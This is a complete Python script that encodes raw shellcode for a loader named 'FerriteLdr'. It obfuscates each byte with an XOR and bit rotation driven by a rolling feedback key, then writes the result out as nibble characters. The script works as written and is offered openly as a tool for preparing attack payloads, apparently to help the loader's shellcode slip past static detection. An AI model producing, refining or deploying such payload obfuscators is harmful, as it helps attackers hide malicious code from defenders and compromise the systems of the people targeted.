import argparse
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def encode_byte(byte, key):
    byte = ((byte ^ key) >> 3 | (byte ^ key) << 5) & 0xFF
    return byte

def nibble_encode(data, seed=0xA5):
    encoded = []
    feedback = seed
    for byte in data:
        obfuscated_byte = encode_byte(byte, feedback)
        high_nibble = (obfuscated_byte >> 4) & 0x0F
        low_nibble = obfuscated_byte & 0x0F
        encoded.append(ALPHABET[high_nibble])
        encoded.append(ALPHABET[low_nibble])
        feedback = (feedback + byte) & 0xFF
    return ''.join(encoded)

def encode_shellcode(input_file, output_file, seed=0xA5):
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    encoded_shellcode = nibble_encode(shellcode, seed)
    with open(output_file, 'w') as f:
        f.write(encoded_shellcode)

    print(f"Encoded shellcode saved to {output_file}!!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encode your raw .bin shellcode for FerriteLdr")
    parser.add_argument("input_file", help="Path to the shellcode .bin file")
    parser.add_argument("output_file", help="Path to save the encoded version")
    parser.add_argument("--seed", type=int, default=0xA5, help="Initial seed for the feedback loop")
    args = parser.parse_args()
    encode_shellcode(args.input_file, args.output_file, args.seed)
